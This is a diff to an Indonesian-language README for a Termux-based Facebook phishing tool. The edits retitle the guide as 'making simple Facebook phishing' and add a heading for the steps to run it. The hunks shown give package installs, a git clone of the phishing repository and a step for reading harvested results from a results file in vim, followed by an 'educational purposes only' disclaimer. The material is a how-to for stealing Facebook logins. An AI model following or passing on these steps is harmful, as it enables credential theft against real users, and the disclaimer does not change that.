@@ -1,4 +1,4 @@
-## Phising sederhana menggunakan Termux di Android
+## Membuat Phishing Facebook Sederhana Menggunakan Termux di Android
 
    ```bash
    pkg update && pkg upgrade
@@ -20,7 +20,8 @@ Jika ingin menggunakan Termux seperti yang saya gunakan [Download Disini.](https
 
 Buka Termux dan update package `pkg update && pkg upgrade`.
 
-__Install paket yang di butuhkan :__
+__Install Paket yang Dibutuhkan:__
+
 ```bash
 pkg install nodejs
 ```
@@ -28,7 +29,8 @@ pkg install nodejs
 pkg install git
 ```
 
-__Selanjutnya ikuti langkah-langkah berikut :__
+## Langkah-Langkah Menjalankan Phishing
+
 ```bash
 git clone https://github.com/sandhemongss/simple-fb-phising.git
 ```
@@ -84,5 +86,5 @@ vim chace/result.txt
 `:q!` Keluar dari program Vim.
 
 
-## WARNING : 
-***This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases.***
+## WARNING
+***This tool is only for educational purposes. Unauthorized use of this tool for malicious intent or illegal activities is prohibited. We do not take responsibility for any misuse.***
